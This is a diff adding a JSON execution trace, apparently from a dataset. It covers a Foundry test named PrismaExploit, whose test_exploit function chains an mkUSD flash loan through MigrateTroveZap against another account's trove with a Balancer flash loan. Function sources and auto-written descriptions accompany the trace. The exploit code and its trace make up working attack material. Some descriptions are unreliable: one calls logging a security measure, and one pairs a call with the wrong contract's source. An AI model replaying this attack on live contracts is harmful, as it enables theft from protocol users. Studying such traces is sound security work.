@@ -1,0 +1,3747 @@
+[
+    {
+        "id": "2867860",
+        "args": "",
+        "original_code": "    function test_exploit() public {\n        uint256 price = priceFeed.fetchPrice(wstETH);\n        console2.log(\"Price Feed Price: \", price);\n\n        // start with ~1800 mkUSD\n        deal(address(mkUSD), address(this), 1_800_000_022_022_732_637);\n\n        console2.log(\"Attacker start with ~1800 mkUSD: \", IERC20(mkUSD).balanceOf(address(this)));\n        console2.log(\"start with wstETH balance before attack : \", IERC20(wstETH).balanceOf(address(this)));\n\n        // get mkUSD loan\n\n        //     address account,\n        //     address troveManagerFrom,\n        //     address troveManagerTo,\n        //     uint256 maxFeePercentage,\n        //     uint256 coll,\n        //     address upperHint,\n        //     address lowerHint\n\n        // data\n        // bytes memory data = hex\"00000000000000000000000056a201b872b50bbdee0021ed4d1bb36359d291ed0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f\";\n\n        uint256 amount = 1_442_100_643_475_620_087_665_721;\n\n        address account = 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED;\n        address troveManagerFrom = address(TroveManager);\n        address troveManagerTo = address(TroveManager);\n        uint256 maxFeePercentage = 5_000_000_325_833_471;\n        uint256 coll = 463_184_447_350_099_685_758;\n\n        bytes memory data = abi.encode(\n            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)\n        );\n\n        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(wstETH);\n\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1_000_000_000_000_000_000;\n\n        uint256[] memory feeAmounts = new uint256[](1);\n        feeAmounts[0] = 0;\n\n        // get balancer wstETH loan\n        vault.flashLoan(address(this), tokens, amounts, abi.encode(\"\"));\n    }\n\n",
+        "description": "1. Core functions:  \nThe `test_exploit` function simulates an attack scenario involving borrowing and manipulating tokens. It starts by fetching the price of a specific token (`wstETH`) from a price feed. Then, it allocates a large amount of `mkUSD` tokens to the attacker's address. The function proceeds to execute a flash loan, borrowing a significant amount of `mkUSD` and using it to interact with a loan management system (`TroveManager`). Finally, it initiates another flash loan to borrow `wstETH` tokens from a vault. The purpose of this function is to test or demonstrate how an attacker could exploit certain mechanisms in the system.\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- It uses `console2.log` to log important values, which helps in debugging and monitoring the process.  \n- The `deal` function is used to simulate the allocation of tokens, ensuring the attacker has the necessary funds to start the exploit.  \n- The `flashLoan` mechanism is used to borrow tokens temporarily, which is a common DeFi feature but can be exploited if not properly secured.  \n- The function encodes data using `abi.encode` to ensure proper formatting and compatibility when interacting with other contracts.  \n\n3. Parameter Function:  \nThe function parameters play specific roles:  \n- `priceFeed.fetchPrice(wstETH)`: Fetches the current price of `wstETH` from a price feed.  \n- `deal(address(mkUSD), address(this), 1_800_000_022_022_732_637)`: Allocates a specific amount of `mkUSD` tokens to the attacker's address.  \n- `IMKUSDLoan(mkUSD).flashLoan(...)`: Initiates a flash loan for `mkUSD` tokens, specifying the borrower, loan amount, and encoded data.  \n- `vault.flashLoan(...)`: Initiates another flash loan for `wstETH` tokens, specifying the borrower, token addresses, amounts, and additional data.  \n\n4. Return description:  \nThe function does not explicitly return any value. Instead, it logs key information such as the price of `wstETH`, the attacker's starting balance of `mkUSD`, and their `wstETH` balance before the attack. These logs help track the state of the system during the exploit simulation. The function's primary purpose is to execute a sequence of actions rather than compute and return a specific value.  \n\nIn summary, the `test_exploit` function simulates an attack by borrowing and manipulating tokens, using logging and flash loans to demonstrate potential vulnerabilities in the system.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "70222",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": "    function fetchPrice(address _token) public returns (uint256) {\n        PriceRecord memory priceRecord = priceRecords[_token];\n        OracleRecord memory oracle = oracleRecords[_token];\n\n        uint256 scaledPrice = priceRecord.scaledPrice;\n        // We short-circuit only if the price was already correct in the current block\n        if (priceRecord.lastUpdated != block.timestamp) {\n            if (priceRecord.lastUpdated == 0) {\n                revert PriceFeed__UnknownFeedError(_token);\n            }\n\n            (FeedResponse memory currResponse, FeedResponse memory prevResponse, bool updated) = _fetchFeedResponses(\n                oracle.chainLinkOracle,\n                priceRecord.roundId\n            );\n\n            if (updated) {\n                scaledPrice = _processFeedResponses(_token, oracle, currResponse, prevResponse, priceRecord);\n            } else {\n                if (_isPriceStale(priceRecord.timestamp, oracle.heartbeat)) {\n                    revert PriceFeed__FeedFrozenError(_token);\n                }\n\n                priceRecord.lastUpdated = uint32(block.timestamp);\n                priceRecords[_token] = priceRecord;\n            }\n        }\n\n        if (oracle.isEthIndexed) {\n            uint256 ethPrice = fetchPrice(address(0));\n            return (ethPrice * scaledPrice) / 1 ether;\n        }\n        return scaledPrice;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to fetch and calculate the current price of a specific token. It first retrieves the stored price and related oracle data for the token. If the price was not updated in the current block, it checks for updates from an external data source (like ChainLink). If the price is stale or unavailable, it raises an error. Finally, if the token's price is indexed to Ethereum (ETH), it adjusts the price based on the current ETH price before returning the result.\n\n2. **Security mechanism:**  \n   - The function uses `revert` statements to handle errors, ensuring that invalid or stale prices are not processed.  \n   - It checks if the price was updated in the current block to avoid unnecessary external calls.  \n   - It validates whether the price is stale using a heartbeat mechanism, preventing outdated data from being used.  \n   - The function ensures that the token's price is correctly adjusted if it is indexed to ETH, maintaining accuracy.  \n\n3. **Parameter Function:**  \n   - `_token`: This is the address of the token for which the price is being fetched. It acts as the key to retrieve the stored price and oracle data.  \n\n4. **Return description:**  \n   The function returns the calculated price of the token. If the token's price is indexed to ETH, it multiplies the token's scaled price by the current ETH price and divides by `1 ether` to normalize the value. If not indexed to ETH, it directly returns the scaled price.  \n\n**In summary,**  \nThis function fetches and calculates the current price of a token, ensuring accuracy by checking for updates and handling errors. It adjusts the price if the token is indexed to ETH and returns the final value.",
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "15643",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000100000000000003c50000000000000000000000000000000000000000000000000ddbd0e10203a67c0000000000000000000000000000000000000000000000000000000066047873000000000000000000000000000000000000000000000000000000006604787300000000000000000000000000000000000000000000000100000000000003c5"
+    },
+    {
+        "id": "7410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000003c50000000000000000000000000000000000000000000000000ddbd0e10203a67c0000000000000000000000000000000000000000000000000000000066047873000000000000000000000000000000000000000000000000000000006604787300000000000000000000000000000000000000000000000000000000000003c5"
+    },
+    {
+        "id": "15735",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000006000000000000383d00000000000000000000000000000000000000000000000000000053667180400000000000000000000000000000000000000000000000000000000066054c9b0000000000000000000000000000000000000000000000000000000066054c9b000000000000000000000000000000000000000000000006000000000000383d"
+    },
+    {
+        "id": "7502",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000383d00000000000000000000000000000000000000000000000000000053667180400000000000000000000000000000000000000000000000000000000066054c9b0000000000000000000000000000000000000000000000000000000066054c9b000000000000000000000000000000000000000000000000000000000000383d"
+    },
+    {
+        "id": "7345",
+        "args": "110680464442257324092 [1.106e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000006000000000000383c000000000000000000000000000000000000000000000000000000536f5fec780000000000000000000000000000000000000000000000000000000066053e8b0000000000000000000000000000000000000000000000000000000066053e8b000000000000000000000000000000000000000000000006000000000000383c"
+    },
+    {
+        "id": "3556",
+        "args": "14396 [1.439e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000383c000000000000000000000000000000000000000000000000000000536f5fec780000000000000000000000000000000000000000000000000000000066053e8b0000000000000000000000000000000000000000000000000000000066053e8b000000000000000000000000000000000000000000000000000000000000383c"
+    },
+    {
+        "id": "0",
+        "args": "\"Price Feed Price: \", 4155472023355548634105 [4.155e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a common function in token contracts to allow users or other contracts to query how many tokens a particular account holds.\n\n2. **Security mechanism**:  \n   The function uses the `public` and `view` modifiers. The `public` modifier allows anyone to call this function, while the `view` modifier ensures that the function does not modify the state of the contract, making it safe to call without risking any changes to the contract's data. Additionally, the `virtual override` keywords indicate that this function can be overridden by derived contracts, providing flexibility in its implementation.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `account`, which is an address. This parameter specifies the account whose balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. **Return description**:  \n   The function returns a `uint256` value, which represents the balance of the specified account. It retrieves this value directly from the `_balances` mapping, where the account address is used as the key to find the associated balance.\n\nIn summary, the `balanceOf` function is a simple and secure way to check the token balance of a specific account. It uses a public and read-only design to ensure safety and accessibility, and it returns the balance directly from the contract's internal storage.",
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28",
+        "original_code": null,
+        "description": null,
+        "return_value": "[0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731], []"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0x00000000000000000000000000000000000000000000000018fae27bb45c3b5d",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1800000022022732637 [1.8e18]"
+    },
+    {
+        "id": "620",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1800000022022732637 [1.8e18]"
+    },
+    {
+        "id": "0",
+        "args": "\"Attacker start with ~1800 mkUSD: \", 1800000022022732637 [1.8e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "\"start with wstETH balance before attack : \", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1355528",
+        "args": "0xcC7218100da61441905e0c327749972e3CBee9EE, 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 1442100643475620087665721 [1.442e24], 0x00000000000000000000000056a201b872b50bbdee0021ed4d1bb36359d291ed0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f",
+        "original_code": "    function flashLoan(\n        IFlashLoanRecipient recipient,\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external override nonReentrant whenNotPaused {\n        InputHelpers.ensureInputLengthMatch(tokens.length, amounts.length);\n\n        uint256[] memory feeAmounts = new uint256[](tokens.length);\n        uint256[] memory preLoanBalances = new uint256[](tokens.length);\n\n        // Used to ensure `tokens` is sorted in ascending order, which ensures token uniqueness.\n        IERC20 previousToken = IERC20(0);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 amount = amounts[i];\n\n            _require(token > previousToken, token == IERC20(0) ? Errors.ZERO_TOKEN : Errors.UNSORTED_TOKENS);\n            previousToken = token;\n\n            preLoanBalances[i] = token.balanceOf(address(this));\n            feeAmounts[i] = _calculateFlashLoanFeeAmount(amount);\n\n            _require(preLoanBalances[i] >= amount, Errors.INSUFFICIENT_FLASH_LOAN_BALANCE);\n            token.safeTransfer(address(recipient), amount);\n        }\n\n        recipient.receiveFlashLoan(tokens, amounts, feeAmounts, userData);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 preLoanBalance = preLoanBalances[i];\n\n            // Checking for loan repayment first (without accounting for fees) makes for simpler debugging, and results\n            // in more accurate revert reasons if the flash loan protocol fee percentage is zero.\n            uint256 postLoanBalance = token.balanceOf(address(this));\n            _require(postLoanBalance >= preLoanBalance, Errors.INVALID_POST_LOAN_BALANCE);\n\n            // No need for checked arithmetic since we know the loan was fully repaid.\n            uint256 receivedFeeAmount = postLoanBalance - preLoanBalance;\n            _require(receivedFeeAmount >= feeAmounts[i], Errors.INSUFFICIENT_FLASH_LOAN_FEE_AMOUNT);\n\n            _payFeeAmount(token, receivedFeeAmount);\n            emit FlashLoan(recipient, token, amounts[i], receivedFeeAmount);\n        }\n    }\n}\n",
+        "description": "1. Core functions:  \nThe `flashLoan` function allows users to borrow multiple tokens temporarily (a \"flash loan\") and return them within the same transaction. It ensures the borrowed tokens are sent to the recipient, who must return the tokens plus a fee. The function also verifies that the tokens are returned correctly and that the fee is paid.\n\n2. Security mechanism:  \n- `nonReentrant`: Prevents the function from being called again before the current execution finishes, protecting against reentrancy attacks.  \n- `whenNotPaused`: Ensures the function can only be called when the contract is not paused, adding a layer of control.  \n- Input validation: Checks that the lengths of `tokens` and `amounts` arrays match and ensures tokens are sorted to avoid duplicates.  \n- Balance checks: Verifies that the contract has enough tokens to lend and that the recipient repays the loan plus the fee.  \n\n3. Parameter Function:  \n- `recipient`: The address that will receive the borrowed tokens and is responsible for repaying them.  \n- `tokens`: An array of token contracts representing the tokens to be borrowed.  \n- `amounts`: An array of amounts corresponding to each token to be borrowed.  \n- `userData`: Additional data that can be passed to the recipient for custom logic.  \n\n4. Return description:  \nThe function does not return a value directly but performs several checks and actions:  \n- It calculates the fee for each flash loan based on the borrowed amount.  \n- It ensures the borrowed tokens are returned with the correct fee.  \n- It emits an event (`FlashLoan`) to log the details of the loan, including the recipient, token, amount, and fee.  \n\nIn summary, the `flashLoan` function enables temporary borrowing of tokens with strict checks to ensure repayment and fee collection, while security measures protect against common vulnerabilities.",
+        "return_value": "true"
+    },
+    {
+        "id": "1313308",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28, 1442100643475620087665721 [1.442e24], 1297890579128058078899 [1.297e21], 0x00000000000000000000000056a201b872b50bbdee0021ed4d1bb36359d291ed0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f",
+        "original_code": "    function onFlashLoan(\n        address,\n        address,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        require(msg.sender == address(debtToken), \"!DebtToken\");\n        (\n            address account,\n            address troveManagerFrom,\n            address troveManagerTo,\n            uint256 maxFeePercentage,\n            uint256 coll,\n            address upperHint,\n            address lowerHint\n        ) = abi.decode(data, (address, address, address, uint256, uint256, address, address));\n        uint256 toMint = amount + fee;\n        borrowerOps.closeTrove(troveManagerFrom, account);\n        borrowerOps.openTrove(troveManagerTo, account, maxFeePercentage, coll, toMint, upperHint, lowerHint);\n        return _RETURN_VALUE;\n    }\n\n    /// @notice Migrates a trove to another TroveManager for the same collateral\n",
+        "description": "1. Core functions:\nThe main purpose of this function is to handle a flash loan operation. It first checks if the caller is a specific debt token. Then, it decodes the provided data to extract necessary details such as account information, trove managers, fees, collateral, and hints. After that, it calculates the total amount to be minted by adding the loan amount and the fee. The function then closes the trove in the current trove manager and opens a new trove in the target trove manager with the specified parameters. Finally, it returns a predefined value to indicate the completion of the operation.\n\n2. Security mechanism:\nThe function includes a `require` statement to ensure that only the specified debt token can call this function, adding a layer of security by restricting access. This prevents unauthorized entities from executing the function. Additionally, the function uses `abi.decode` to safely extract and interpret the data passed to it, ensuring that the data is correctly formatted and reducing the risk of errors or malicious inputs.\n\n3. Parameter Function:\nThe function takes several parameters:\n- `address`: This is not used within the function.\n- `address`: This is also not used within the function.\n- `uint256 amount`: Represents the amount of the flash loan.\n- `uint256 fee`: Represents the fee associated with the flash loan.\n- `bytes calldata data`: Contains encoded data that includes account details, trove managers, maximum fee percentage, collateral, and hints for opening and closing troves.\n\n4. Return description:\nThe function returns a predefined value `_RETURN_VALUE` which is likely a constant or a specific value defined elsewhere in the contract. This return value is used to signal the successful completion of the flash loan operation and the migration of the trove to another TroveManager.\n\nIn summary, this function manages a flash loan by closing and reopening a trove in different trove managers, ensuring only authorized entities can execute it, and returning a success indicator upon completion.",
+        "return_value": "0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9"
+    },
+    {
+        "id": "534757",
+        "args": "0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6, 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED",
+        "original_code": "    function closeTrove(ITroveManager troveManager, address account) external callerOrDelegated(account) {\n        IERC20 collateralToken;\n\n        uint256 price;\n        bool isRecoveryMode;\n        uint256 totalPricedCollateral;\n        uint256 totalDebt;\n        (collateralToken, price, totalPricedCollateral, totalDebt, isRecoveryMode) = _getCollateralAndTCRData(\n            troveManager\n        );\n        require(!isRecoveryMode, \"BorrowerOps: Operation not permitted during Recovery Mode\");\n\n        (uint256 coll, uint256 debt) = troveManager.applyPendingRewards(account);\n\n        uint256 newTCR = _getNewTCRFromTroveChange(totalPricedCollateral, totalDebt, coll * price, false, debt, false);\n        _requireNewTCRisAboveCCR(newTCR);\n\n        troveManager.closeTrove(account, msg.sender, coll, debt);\n\n        emit TroveUpdated(account, 0, 0, 0, BorrowerOperation.closeTrove);\n\n        // Burn the repaid Debt from the user's balance and the gas compensation from the Gas Pool\n        debtToken.burnWithGasCompensation(msg.sender, debt - DEBT_GAS_COMPENSATION);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `closeTrove` function is designed to close a user's trove (a type of financial position) in a decentralized finance (DeFi) system. It retrieves the necessary data about the collateral and debt associated with the trove, checks if the system is not in recovery mode, applies any pending rewards, and ensures that closing the trove maintains the system's stability. Finally, it closes the trove, updates the system, and burns the repaid debt tokens.\n\n2. Security mechanism:  \n- **`callerOrDelegated(account)`**: Ensures that only the owner of the account or a delegated address can call this function.  \n- **`require(!isRecoveryMode, \"...\")`**: Prevents the function from executing if the system is in recovery mode, ensuring operations are only performed under normal conditions.  \n- **`_requireNewTCRisAboveCCR(newTCR)`**: Validates that the new total collateral ratio (TCR) remains above the critical collateral ratio (CCR), maintaining system stability.  \n- **`troveManager.closeTrove(...)`**: Delegates the actual closing of the trove to a trusted manager contract, ensuring proper handling of the process.  \n\n3. Parameter Function:  \n- **`troveManager`**: A reference to the contract managing the troves, used to interact with and update the trove data.  \n- **`account`**: The address of the user whose trove is being closed. This ensures the function operates on the correct user's financial position.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it performs actions such as closing the trove, burning debt tokens, and emitting an event (`TroveUpdated`) to log the changes. The calculations within the function ensure that the system remains stable and that the user's debt is properly handled.  \n\nIn summary, the `closeTrove` function securely closes a user's trove by validating system conditions, applying rewards, ensuring stability, and updating the system. It uses key security measures to protect against unauthorized access and maintain system integrity.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "31464",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "28786",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000384fda33b46f0f7c0d90000000000000000000000000000000000000000000bf28565a1c01af513b7470000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "2404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "51691",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "51513",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000127f5d91cf416dd86cb0000000000000000000000000000000000000000000530462e8db43db3547dff0000000000000000000000000000000000000000000000d565996e9cad7b3110"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "29884",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "15643",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000001000000000000018c0000000000000000000000000000000000000000000000000f40483601503c400000000000000000000000000000000000000000000000000000000066046f370000000000000000000000000000000000000000000000000000000066046f37000000000000000000000000000000000000000000000001000000000000018c"
+    },
+    {
+        "id": "7410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000018c0000000000000000000000000000000000000000000000000f40483601503c400000000000000000000000000000000000000000000000000000000066046f370000000000000000000000000000000000000000000000000000000066046f37000000000000000000000000000000000000000000000000000000000000018c"
+    },
+    {
+        "id": "51691",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "51513",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000001269a48eb70f454e02c000000000000000000000000000000000000000000048ace2485935989583e4d0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "29884",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "15643",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000100000000000002060000000000000000000000000000000000000000000000000ec344e690d6be50000000000000000000000000000000000000000000000000000000006604ade3000000000000000000000000000000000000000000000000000000006604ade30000000000000000000000000000000000000000000000010000000000000206"
+    },
+    {
+        "id": "7410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000002060000000000000000000000000000000000000000000000000ec344e690d6be50000000000000000000000000000000000000000000000000000000006604ade3000000000000000000000000000000000000000000000000000000006604ade30000000000000000000000000000000000000000000000000000000000000206"
+    },
+    {
+        "id": "43731",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "43553",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000295ec15fd02a94f13040000000000000000000000000000000000000000000532ca09d52425da5200400000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "21924",
+        "args": "0xac3E018457B222d93114458476f3E3416Abbe38F",
+        "original_code": null,
+        "description": null,
+        "return_value": "3818878755114814007881 [3.818e21]"
+    },
+    {
+        "id": "7683",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000001680000000000000000000000000000000000000000000000000ecba5285111eeda000000000000000000000000000000000000000000000000000000006604782b000000000000000000000000000000000000000000000000000000006604782b0000000000000000000000000000000000000000000000000000000000000168"
+    },
+    {
+        "id": "26955",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000118a091484154fd3ae3000000000000000000000000000000000000000000042f99826b6ed5bef54f280000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "24277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000118a091484154fd3ae3000000000000000000000000000000000000000000042f99826b6ed5bef54f280000000000000000000000000000000000000000000000e144c24c9b85360bf9"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+        "original_code": null,
+        "description": null,
+        "return_value": "4155472023355548634105 [4.155e21]"
+    },
+    {
+        "id": "24455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "24277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000011d1e14e926160379a200000000000000000000000000000000000000000004d8da049d11366e2ef3060000000000000000000000000000000000000000000000cf0596ca7d7873ea49"
+    },
+    {
+        "id": "404",
